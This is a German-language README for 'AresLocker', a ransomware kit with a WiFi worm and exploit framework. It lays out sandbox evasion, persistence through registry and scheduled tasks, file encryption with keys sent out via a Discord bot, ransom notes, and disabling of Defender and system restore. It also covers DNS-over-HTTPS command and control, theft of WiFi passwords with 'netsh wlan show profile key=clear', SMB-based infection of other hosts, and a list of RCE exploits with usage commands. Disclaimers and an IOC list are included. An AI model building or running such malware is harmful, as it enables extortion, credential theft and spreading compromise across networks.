# Global Movement - AresLocker: Das Revolutionäre WiFi-Wurm-Framework

# Wichtiger rechtlicher Hinweis

**Dieses Projekt dient ausschließlich Forschungs-, Analyse- und Testzwecken im Bereich der IT-Sicherheit. Jegliche Nutzung, Verbreitung oder Anwendung auf fremden Systemen ohne ausdrückliche und schriftliche Erlaubnis ist strengstens untersagt und kann straf- sowie zivilrechtliche Konsequenzen nach sich ziehen. Der Autor übernimmt keinerlei Haftung für Schäden, Datenverluste oder sonstige Folgen, die durch unsachgemäßen, fahrlässigen oder missbräuchlichen Einsatz entstehen. Die Verantwortung für die Einhaltung aller geltenden Gesetze und Vorschriften liegt ausschließlich beim Nutzer.**

**Verwenden Sie dieses Projekt niemals auf produktiven Systemen oder außerhalb von kontrollierten, legalen Testumgebungen. Mit der Nutzung bestätigen Sie, dass Sie sich der rechtlichen Risiken bewusst sind und sämtliche Konsequenzen selbst tragen.**

# Nutzungsbedingungen

1. **Zweck:** Dieses Projekt ist ausschließlich für legale Forschungs-, Analyse- und Testzwecke im Bereich der IT-Sicherheit bestimmt.
2. **Verbotene Nutzung:** Jegliche Anwendung, Verbreitung oder Nutzung auf fremden Systemen ohne ausdrückliche, schriftliche Erlaubnis des Eigentümers ist untersagt und kann straf- sowie zivilrechtliche Konsequenzen nach sich ziehen.
3. **Haftungsausschluss:** Der Autor übernimmt keinerlei Haftung für Schäden, Datenverluste oder sonstige Folgen, die durch unsachgemäßen, fahrlässigen oder missbräuchlichen Einsatz entstehen.
4. **Eigenverantwortung:** Die Einhaltung aller geltenden Gesetze und Vorschriften liegt ausschließlich beim Nutzer. Der Nutzer trägt sämtliche rechtlichen Konsequenzen selbst.
5. **Keine Produktivnutzung:** Die Nutzung auf produktiven Systemen oder außerhalb von kontrollierten, legalen Testumgebungen ist strengstens untersagt.
6. **Änderungen:** Der Autor behält sich vor, die Nutzungsbedingungen jederzeit zu ändern. Es gilt die jeweils aktuelle Fassung in diesem Dokument.
7. **Hinweis:** Mit der Nutzung dieses Projekts erkennen Sie diese Bedingungen ausdrücklich an.

# AresLocker Technische Übersicht

## Funktionsübersicht

### 1. Start & Initialisierung
Das Programm wird mit `run.py` gestartet und prüft:
- Python-Version (>= 3.8)
- Erforderliche Module (z.B. cryptography, discord.py)
- Administratorrechte (`ctypes.windll.shell32.IsUserAnAdmin()`)

Sicherheitsmaßnahmen:
- Mutex `Global\\AresLocker` verhindert Mehrfachausführung
- Logging mit rotierenden Dateien
- Prozessname wird verschleiert

### 2. Analysephase (Sandbox-/VM-Erkennung)
Mechanismen zur Erkennung von Analyseumgebungen:
- **Hardware:** VM-MAC-Präfixe, CPUID, RAM-/HDD-Größe
- **Software:** Bekannte Tools im Speicher, Debugger (`IsDebuggerPresent()`), Registry-Keys von VMs
- **Netzwerk:** DNS bekannter Sandbox-Dienste, Latenztests

**Bei Analyseerkennung:**
- Sofortige Selbstlöschung (`dell.bat`), Secure-Wipe temporärer Dateien, Registry-Bereinigung

**Bei unauffälliger Umgebung:**
- Entpacken verschlüsselter Archive (7zip)
- Start der Persistenzmechanismen
- Hauptfunktionen werden initialisiert

### 3. Persistenz
Mehrere Methoden sorgen für Autostart und Selbstheilung:
- Batch: `run.bat` (Autostart, Registry, geplante Tasks)
- Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- Geplante Tasks (`schtasks`)
- Kopie ins Autostart-Verzeichnis
- Optional: Manipulation von Diensten/Scheduled Tasks
- Regelmäßige Überprüfung und Wiederherstellung der Persistenz

### 4. Terminüberwachung
Zeitgesteuerter Ablauf über `trigger.bat`:
- Überwachung eines vordefinierten Zeitpunkts (lokal oder via Zeitserver)
- Verzögerung zur Erschwerung der Analyse möglich
- Wen der Timer lang genug ist können damit Backups infiltiriert werden um     
  wiederherstellung vollständig zu verhindern.
- Bei Erreichen des Zeitpunkts:
  - Start der Hauptfunktion (`main.py`): Dateiverschlüsselung, Anzeige der Lösegeldforderung
  - Deaktivierung von Schutzmechanismen (`disalbe.py`): Registry, Dienste, Prozesse
  - Optional: Manipulation der Hosts-Datei

### 5. Hauptfunktion: Dateiverschlüsselung & Schlüsselmanagement
- Systemweite Dateisuche (Ausschluss von Systemverzeichnissen und bestimmten Dateitypen)
- Für jede Datei: Generierung eines individuellen AES-256-Schlüssels (AES-GCM, IV pro Datei)
- AES-Schlüssel wird **nicht lokal gespeichert**, sondern mit ECIES (SECP256K1, Public Key aus `public.pem`) verschlüsselt
- Schlüssel und Metadaten werden **asynchron per Discord-Bot** an einen Channel gesendet (`key.bin`/`key_<hash>.bin`)
- Nach erfolgreicher Verschlüsselung: Originaldatei löschen, Integrität per SHA256-Hash prüfen
- Schlüsselmanagement im RAM (sichere Löschung nach Gebrauch)
- Erstellung und Platzierung der Lösegeldforderung (`note.py`)
- Optional: Verschlüsselung von Netzwerkfreigaben und Beenden bestimmter Prozesse

#### Ablaufdiagramm (vereinfacht)
1. Start (`run.py`): Initialisierung, Rechteprüfung, Logging
2. Analysephase → ggf. Selbstlöschung (`dell.bat`)
3. Extraktion & Persistenz (`extract.bat`, `run.bat`)
4. Terminüberwachung (`trigger.bat`)
5. Hauptfunktion: Verschlüsselung & Anzeige der Lösegeldforderung (`main.py`, `encryptor.py`, `note.py`)
   - Schutzmechanismen deaktivieren (`disalbe.py`)
   - Systemwiederherstellung verhindern
   - Netzwerkfreigaben und externe Laufwerke optional einbeziehen

#### Hinweise zur Konfiguration
Alle zentralen Einstellungen werden in `encryptor/arciv/config.py` über die Klasse `Config` vorgenommen. Wichtige Parameter sind u.a.:
- Bitcoin-Adresse, Kontakt-E-Mail, Countdown, Timer-Datei
- Discord-Bot-Token, Channel-ID, Schlüsseldateiname
- Chunk-Größe, Pfade, Logdatei, Dateiendung
- Upload-Retries, Ausschlussverzeichnisse

### 6. Global Movement - Netzwerk-Verbreitung
Das Global Movement Modul implementiert fortschrittliche Techniken zur Malware-Verbreitung über verschiedene Netzwerk-Protokolle und -Methoden.

#### 6.1 DNS-over-HTTPS (DoH) mit WiFi-Integration
**Dateien:**
- `AresLocker/global_movement/doh_server.py` - DoH-Server mit integrierter WiFi-Funktionalität
- `AresLocker/global_movement/doh_client.py` - DoH-Client mit integrierter WiFi-Funktionalität
- `AresLocker/global_movement/doh_wifi_config.py` - Konfiguration für DoH-WiFi-Integration

**Funktionen:**
- DNS-over-HTTPS Command & Control
- WLAN-Zugangsdaten-Sammlung und -Verbreitung
- Automatische Netzwerk-Verbindung
- Stealth-Kommunikation über DNS-Traffic

#### 6.2 Exploit Framework
**Dateien:**
- `AresLocker/global_movement/exploits/base_exploit.py` - Abstrakte Basisklasse für alle Exploits
- `AresLocker/global_movement/exploits/exploit_RAM_loader.py` - Dynamischer Exploit-Loader
- `AresLocker/global_movement/main.py` - Hauptprogramm für Exploit-Verwaltung
- `AresLocker/global_movement/exploits/` - Verschiedene Exploit-Kategorien (HTTP, SSH, RDP, etc.)

**Funktionen:**
- Standardisiertes Exploit-Framework
- Dynamisches Laden und Ausführen von Exploits
- Automatische Target-Verifikation und Payload-Generierung
- Konsistente Logging- und Fehlerbehandlung
- Session-Management und Statusverfolgung

**Verfügbare Exploit-Kategorien:**
- **HTTP Exploits:** CVE_2019_11510, CVE_2020_5902, CVE_2021_22986, etc.
- **HTTPS Exploits:** CVE_2022_22965 (Spring4Shell), CVE-2023_34362, etc.
- **SSH Exploits:** CVE_2016_0777, CVE_2018_15473, CVE_2023_38408
- **RDP Exploits:** CVE_2019_0708 (BlueKeep), CVE_2020_0609, CVE_2024_49112
- **Windows Core Exploits:** CVE_2021_44228 (Log4Shell), CVE_2022_34718, etc.
- **Weitere Protokolle:** Redis, Apache Tomcat, etc.

**Verwendung des BaseExploit Frameworks:**
```python
# Neuen Exploit erstellen
class MeinExploit(BaseExploit):
    def verify_target(self) -> bool:
        # Target-Verifikation implementieren
        pass
    
    def generate_payload(self) -> Any:
        # Payload generieren
        pass
    
    def execute(self) -> bool:
        # Exploit ausführen
        pass

# Exploit verwenden
exploit = MeinExploit("192.168.1.100", port=8080)
success = exploit.run()
```

**Über das Hauptprogramm:**
```bash
# Alle verfügbaren Exploits anzeigen
python AresLocker/global_movement/main.py --list

# Exploit ausführen
python AresLocker/global_movement/main.py --execute http CVE_2021_22986
```

## Datei- und Verzeichnisstruktur

- `AresLocker/encryptor/arciv/`: Hauptskripte und Batch-Dateien
- `AresLocker/encryptor/`: Weitere Komponenten (z.B. 7z.exe, extract.bat)
- `AresLocker/keys/`: Schlüsseldateien (`private.pem`, `public.pem`)
- `AresLocker/decryptor/`: Tools zur Entschlüsselung (bei vorhandenem Private Key)
- `AresLocker/global_movement/`: Netzwerk-Verbreitung und Exploit-Framework
  - `doh_server.py`, `doh_client.py`, `doh_wifi_config.py` - DoH WiFi Integration
  - `exploits/` - Exploit-Framework mit verschiedenen Kategorien
  - `main.py` - Exploit-Verwaltung
  - `ip_scanner/` - Netzwerk-Scanning-Tools

**Wichtige Dateien:**
- `start.py`: Initialisierung, Rechteprüfung, Logging
- `extract.bat`: Entpacken, AV-Umgehung
- `run.bat`: Persistenz, Autostart
- `trigger.bat`: Zeitüberwachung
- `main.py`: Steuerung der Hauptfunktion
- `encryptor.py`: Verschlüsselung, Dateisuche, Schlüsselmanagement, Discord-Upload
- `note.py`: Erstellung/Anzeige der Lösegeldforderung
- `disalbe.py`: Deaktivierung von Schutzmechanismen
- `dell.bat`: Selbstlöschung
- `7z.exe`: Entpacken von Archiven

**Ablaufdiagramm (vereinfacht):**
1. Start (`run.py`): Initialisierung, Rechteprüfung, Logging
2. Analysephase → ggf. Selbstlöschung (`dell.bat`)
3. Extraktion & Persistenz (`extract.bat`, `run.bat`)
4. Terminüberwachung (`trigger.bat`)
5. Hauptfunktion: Verschlüsselung & Anzeige der Lösegeldforderung (`main.py`, `encryptor.py`, `note.py`)
   - Schutzmechanismen deaktivieren (`disalbe.py`)
   - Systemwiederherstellung verhindern
   - Netzwerkfreigaben und externe Laufwerke optional einbeziehen
6. Optional: Global Movement - Netzwerk-Verbreitung über DoH und Exploits

# Indikatoren einer Kompromittierung (IOCs)

Die folgenden Merkmale können auf eine Infektion mit AresLocker hindeuten:

**Dateinamen und Dateiendungen:**
- Verschlüsselte Dateien mit der Endung `.areslock`
- `key.txt` (verschlüsselter universeller AES-Schlüssel)
- `encryption.log` (Logdatei)
- `ransom_timer.txt` (Timer-Datei)
- `note.exe` (Lösegeldforderung)
- Batch-Dateien: `extract.bat`, `run.bat`, `trigger.bat`, `dell.bat`
- Python-Skripte: `main.py`, `encryptor.py`, `note.py`, `disalbe.py`, `dc_extract.py`
- `7z.exe` (wird zur Extraktion verwendet)

**Verzeichnisse und Pfade:**
- `AresLocker/encryptor/arciv/`, `AresLocker/keys/`, `AresLocker/decryptor/`

**Prozesse:**
- `note.exe`

**Registry-Keys (Persistenz):**
- `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`

**Geplante Tasks:**
- Aufgaben, die auf `run.bat` oder `note.exe` verweisen

**Netzwerk:**
- Kommunikation mit Discord (Bot-Token, Channel-ID)
- Optional: Verbindung zu `https://www.bitcoin.com`

**Kontaktinformationen in der Lösegeldforderung:**
- Bitcoin-Adresse: `1A2b3C4d5E6f7G8h9I0jKLMNOPqrStUv`
- Kontakt-E-Mail: `unlock@fakedomain.to`

**Weitere Hinweise:**
- Dateien/Prozesse mit den o.g. Namen
- Unerwartete Dateien im Autostart oder geplante Tasks
- Log- oder Schlüsseldateien im Benutzerverzeichnis
- Netzwerkverbindungen zu Discord-IP-Adressen
- Manipulierte Hosts-Datei (z. B. Blockierung von Sicherheitsupdates oder Hilfeseiten)
- Geänderte Registry-Einträge (Task-Manager, Defender, Systemwiederherstellung deaktiviert)
- Geänderte oder neue geplante Tasks mit ungewöhnlichen Triggern
- Temporäre Dateien oder Reste im Benutzerverzeichnis
- Auffällige Logdateien oder Spuren im Windows-Ereignisprotokoll
- Hinweise auf Selbstheilungsmechanismen (z. B. wiederhergestellte Autostart-Einträge)
- Dateien mit der Endung `.areslock` auf Netzlaufwerken oder USB-Geräten

# Rechtlicher Hinweis (erneut)

**Dieses Dokument und alle enthaltenen Informationen dienen ausschließlich Forschungs-, Analyse- und Testzwecken im Bereich der IT-Sicherheit. Jegliche Nutzung, Verbreitung oder Anwendung auf fremden Systemen ohne ausdrückliche und schriftliche Erlaubnis ist strengstens untersagt und kann straf- sowie zivilrechtliche Konsequenzen nach sich ziehen. Der Autor übernimmt keinerlei Haftung für Schäden, Datenverluste oder sonstige Folgen, die durch unsachgemäßen, fahrlässigen oder missbräuchlichen Einsatz entstehen. Die Verantwortung für die Einhaltung aller geltenden Gesetze und Vorschriften liegt ausschließlich beim Nutzer.**

# Global Movement Framework - Technische Dokumentation

## 1. Architektur-Übersicht

Das Framework besteht aus drei Hauptkomponenten:

### 1.1 WiFi-Manager (WiFiManager)
- Netzwerk-Scanning und -Analyse
- Credential-Management
- Verbindungssteuerung
- Netzwerk-Verbreitung

### 1.2 DNS-over-HTTPS Client (DoHClient)
- Command & Control über DNS
- Verschlüsselte Kommunikation
- Befehlsverarbeitung
- Stealth-Operationen

### 1.3 Exploit-Framework
- Modulare Exploit-Struktur
- Target-Verifikation
- Payload-Generierung
- Multi-Protokoll-Support

## 2. Detaillierte Komponenten-Dokumentation

### 2.1 WiFi-Manager (WiFiManager)

#### 2.1.1 Netzwerk-Scanning
```python
class WiFiManager:
    def scan_available_networks(self):
        """Scannt nach verfügbaren WLAN-Netzwerken
        Implementation: netsh wlan show networks mode=bssid
        Returns: List[Dict] - Gefundene Netzwerke mit Details
        """
        # Erfasste Parameter pro Netzwerk:
        # - SSID/BSSID
        # - Netzwerktyp (Infrastructure/Ad-hoc)
        # - Authentifizierung (WPA2/WPA/WEP/Open)
        # - Verschlüsselung (AES/TKIP/WEP)
        # - Signalstärke (%)
```

##### Konfiguration
```python
WIFI_CONFIG = {
    'scan_interval': 300,        # Scan-Intervall (Sekunden)
    'max_networks_per_scan': 50, # Max. Netzwerke pro Scan
    'signal_strength_threshold': -70,  # Min. Signalstärke (dBm)
    'auto_connect': True,        # Auto-Verbindung
    'stealth_mode': True         # Stealth-Modus
}

# Netzwerk-Filterung
EXCLUDED_NETWORKS = [
    'AndroidAP',    # Mobile Hotspots
    'iPhone',       # iOS Hotspots
    'Guest',        # Gast-Netzwerke
    'Test',         # Test-Netzwerke
    'Public'        # Öffentliche Netze
]

# Netzwerk-Priorisierung
PRIORITY_NETWORKS = [
    'Office',       # Büro-Netzwerke
    'Corporate',    # Unternehmensnetze
    'Business'      # Geschäftsnetze
]
```

#### 2.1.2 Credential-Management
```python
def get_wifi_profiles(self):
    """Extrahiert WLAN-Profile aus Windows
    Implementation: netsh wlan show profiles
    Returns: List[Dict] - Profile mit Credentials
    """
    # Extrahierte Daten pro Profil:
    profile_data = {
        'ssid': str,           # Netzwerkname
        'password': str,       # Klartext-Passwort
        'authentication': str, # Auth-Typ
        'encryption': str,     # Verschlüsselung
        'hostname': str,       # Computername
        'timestamp': str       # ISO-Zeitstempel
    }
```

#### 2.1.3 Verbindungsmanagement
```python
def connect_to_network(self, ssid, password):
    """Verbindet mit WLAN-Netzwerk
    Args:
        ssid (str): Netzwerkname
        password (str): Passwort
    Returns:
        bool: Verbindungsstatus
    """
    # Prozess:
    # 1. XML-Profil erstellen
    # 2. Profil temporär speichern
    # 3. Profil installieren
    # 4. Verbindung aufbauen
    # 5. Cleanup durchführen
```

### 2.2 DNS-over-HTTPS Client (DoHClient)

#### 2.2.1 Grundkonfiguration
```python
DOH_CONFIG = {
    'provider': 'https://cloudflare-dns.com/dns-query',
    'domain': 'example.com',
    'chunk_size': 63,  # Max. DNS-Label-Länge
    'retry_interval': 30,
    'timeout': 10
}
```

#### 2.2.2 Befehlsverarbeitung
```python
COMMAND_CONFIG = {
    'allowed_commands': [
        'wifi_upload',   # Credentials hochladen
        'wifi_get',      # Netzwerke abrufen
        'wifi_spread',   # Verbreitung starten
        'wifi_scan'      # Netzwerk-Scan
    ],
    'blocked_commands': [
        'format',
        'del',
        'rmdir',
        'shutdown'
    ]
}
```

### 2.3 Exploit-Framework

#### 2.3.1 Basis-Exploit-Klasse
```python
class BaseExploit:
    def verify_target(self) -> bool:
        """Überprüft Ziel auf Verwundbarkeit"""
        pass
    
    def generate_payload(self) -> bytes:
        """Generiert exploit-spezifischen Payload"""
        pass
    
    def execute(self) -> bool:
        """Führt Exploit aus"""
        pass
```

#### 2.3.2 Exploit-Kategorien
- HTTP/HTTPS Exploits (Web-Server)
- SSH Exploits (Linux/Unix)
- RDP Exploits (Windows)
- SMB Exploits (Windows-Freigaben)
- Redis Exploits (Datenbanken)

## 3. Sicherheit und Logging

### 3.1 Logging-Konfiguration
```python
LOGGING_CONFIG = {
    'log_level': 'INFO',
    'log_file': 'movement.log',
    'max_size': 10485760,  # 10 MB
    'backup_count': 5,
    'format': '%(asctime)s - %(levelname)s - %(message)s'
}
```

### 3.2 Fehlerbehandlung
```python
ERROR_CONFIG = {
    'max_retries': 3,
    'retry_delay': 5,
    'timeout': 30,
    'cleanup_on_error': True
}
```

## 4. Verwendung

### 4.1 Server-Steuerung
```bash
# Server starten
python doh_server.py --config server_config.json

# Verfügbare Befehle:
wifi_upload  # Credentials hochladen
wifi_spread  # Verbreitung starten
wifi_scan    # Netzwerk-Scan
wifi_stats   # Statistiken anzeigen
```

### 4.2 Client-Operationen
```bash
# Client starten
python doh_client.py --config client_config.json

# Automatische Funktionen:
- Heartbeat-Kommunikation
- WLAN-Profil-Extraktion
- Netzwerk-Scanning
- Befehlsausführung
```

## Fazit

Das AresLocker Global Movement Framework ist die **erste vollständig autonome WiFi-Wurm-Technologie** mit DNS-over-HTTPS Command & Control. Es kombiniert drei revolutionäre Konzepte zu einer unaufhaltsamen Malware-Verbreitungsmaschine, die eine neue Ära in der Cyber-Sicherheit einleitet.

**Diese Technologie hat das Potenzial, die Art und Weise zu verändern, wie wir über Malware-Verbreitung denken. Sie ist gleichzeitig ein Meisterwerk der Technik und eine kritische Bedrohung für die Cybersicherheit, die neue Standards für Verteidigungsmaßnahmen setzt.**

---

## Verfügbare Exploits

### HTTP Exploits:
- `CVE_2019_11510` - Pulse Secure VPN RCE
- `CVE_2019_18935` - Telerik WebUI RCE
- `CVE_2020_5902` - F5 BIG-IP RCE
- `CVE_2021_22986` - F5 BIG-IP RCE
- `CVE_2021_31166` - Windows HTTP.sys RCE
- `CVE_2022_21907` - Windows HTTP Protocol Stack RCE

### HTTPS Exploits:
- `CVE_2022_22965` - Spring4Shell RCE
- `CVE_2025_0282` - HTTPS RCE
- `CVE-2023_34362` - HTTPS RCE

### SSH Exploits:
- `CVE_2016_0777` - SSH Information Disclosure
- `CVE_2018_15473` - SSH User Enumeration
- `CVE_2023_38408` - SSH RCE

### RDP Exploits:
- `CVE_2019_0708` - BlueKeep RCE
- `CVE_2020_0609` - RDP RCE
- `CVE_2024_49112` - RDP RCE

### Windows Core Exploits:
- `CVE_2021_44228` - Log4Shell RCE
- `CVE_2022_34718` - Windows TCP/IP IPv6 Fragment Reassembly
- `CVE_2022_34721` - Windows IKEv2 Exploit
- `CVE_2023_21554` - Windows Core RCE
- `CVE_2023_28231` - Windows Core RCE
- `CVE_2024_38063` - Windows Core RCE
- `CVE_2025_1094` - WebSocket Hijacking and RCE
- `CVE_2025_24813` - Windows Core RCE

### Weitere Protokolle:
- `CVE_2020_9484` - Apache Tomcat Session Persistence (HTTP-Proxy)
- `CVE_2022_0543` - Redis Lua Sandbox Escape 

# Global Movement Framework - Technische Dokumentation

## 1. WiFi-Modul (WiFiManager)

### 1.1 Netzwerk-Scanning
```python
def scan_available_networks(self):
    """Scannt nach verfügbaren WLAN-Netzwerken
    - Implementiert über netsh wlan show networks mode=bssid
    - Erfasst: SSID, BSSID, Netzwerktyp, Auth, Verschlüsselung, Signal
    """
    pass
```

#### Konfigurationsparameter
```python
WIFI_CONFIG = {
    'scan_interval': 300,        # 5 Minuten zwischen Scans
    'max_networks_per_scan': 50, # Maximale Netzwerke pro Scan
    'signal_strength_threshold': -70  # Minimale Signalstärke
}

# Ausschlusslisten
EXCLUDED_NETWORKS = [
    'AndroidAP', 'iPhone', 'Mobile Hotspot',
    'Guest', 'Test', 'Demo', 'Public'
]

PRIORITY_NETWORKS = [
    'Office', 'Work', 'Company',
    'Business', 'Corporate', 'Enterprise'
]
```

### 1.2 Credential-Management

#### Profil-Extraktion
```python
def get_wifi_profiles(self):
    """Extrahiert WLAN-Profile aus Windows-Registry
    Returns: List[Dict] mit Profil-Informationen
    """
    # Profil-Extraktion
    cmd_list = "netsh wlan show profiles"
    # Extrahiert pro Profil:
    # - Profilname (SSID)
    # - Schlüsseltyp
    # - Authentifizierung
    # - Verschlüsselung
    
    # Detaillierte Profil-Informationen
    cmd_details = 'netsh wlan show profile name="{profile}" key=clear'
    # Extrahiert:
    # - Klartext-Passwort
    # - Verbindungsmodus
    # - Sicherheitseinstellungen
```

##### Profil-Struktur
```python
profile_data = {
    'ssid': str,           # Netzwerkname
    'password': str,       # Klartext-Passwort
    'authentication': str, # WPA2PSK/WPAPSK/Open
    'encryption': str,     # AES/TKIP/WEP
    'hostname': str,       # Computername
    'timestamp': str       # ISO-Format Zeitstempel
}
```

#### Verbindungsaufbau
```python
def connect_to_network(self, ssid, password, auth_type="WPA2PSK", encryption="AES"):
    """Verbindungsaufbau zu WLAN-Netzwerk
    Args:
        ssid (str): Netzwerkname
        password (str): Netzwerk-Passwort
        auth_type (str): Authentifizierungstyp
        encryption (str): Verschlüsselungsmethode
    Returns:
        bool: Verbindungsstatus
    """
    # 1. XML-Profil generieren
    profile_xml = f"""<?xml version="1.0"?>
    <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
        <SSIDConfig>
            <SSID><name>{ssid}</name></SSID>
        </SSIDConfig>
        <connectionType>ESS</connectionType>
        <connectionMode>auto</connectionMode>
        <MSM>
            <security>
                <authEncryption>
                    <authentication>{auth_type}</authentication>
                    <encryption>{encryption}</encryption>
                    <useOneX>false</useOneX>
                </authEncryption>
                <sharedKey>
                    <keyType>passPhrase</keyType>
                    <protected>false</protected>
                    <keyMaterial>{password}</keyMaterial>
                </sharedKey>
            </security>
        </MSM>
    </WLANProfile>"""
    
    # 2. Profil installieren und verbinden
    # - Temporäre Profildatei erstellen
    # - Profil hinzufügen (netsh wlan add profile)
    # - Verbindung aufbauen (netsh wlan connect)
    # - Aufräumen temporärer Dateien
```

### 1.2 Netzwerk-Verbreitung

#### 1.2.1 IP-Scanning
```python
def scan_network_devices(self, local_ip):
    """Scannt nach aktiven Geräten im lokalen Netzwerk
    Args:
        local_ip (str): Lokale IP-Adresse
    Returns:
        List[str]: Liste aktiver IP-Adressen
    """
    # 1. Netzwerk-Basis ermitteln
    # 2. Ping-Scan (1-254)
    # 3. Aktive Hosts erfassen
```

#### 1.2.2 Infektionsversuche
```python
def attempt_infection(self, target_ip):
    """Versucht Infektion eines Zielgeräts
    Args:
        target_ip (str): IP des Zielgeräts
    Returns:
        bool: Infektionsstatus
    """
    # 1. SMB-Verbindung testen
    # 2. Admin-Share zugreifen
    # 3. Malware kopieren
    # 4. Remote ausführen
```

### 1.3 Sicherheit und Logging

#### 1.3.1 Logging-Konfiguration
```python
LOGGING_CONFIG = {
    'log_level': 'INFO',
    'log_file': 'doh_wifi.log',
    'log_format': '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    'max_log_size': 10485760,  # 10 MB
    'backup_count': 5,
    'console_output': True
}
```

#### 1.3.2 Fehlerbehandlung
```python
ERROR_MESSAGES = {
    'connection_failed': 'Failed to connect to network',
    'scan_failed': 'Failed to scan networks',
    'upload_failed': 'Failed to upload credentials',
    'command_failed': 'Command execution failed',
    'timeout': 'Operation timed out',
    'permission_denied': 'Permission denied',
    'network_unavailable': 'Network not available'
}
``` 
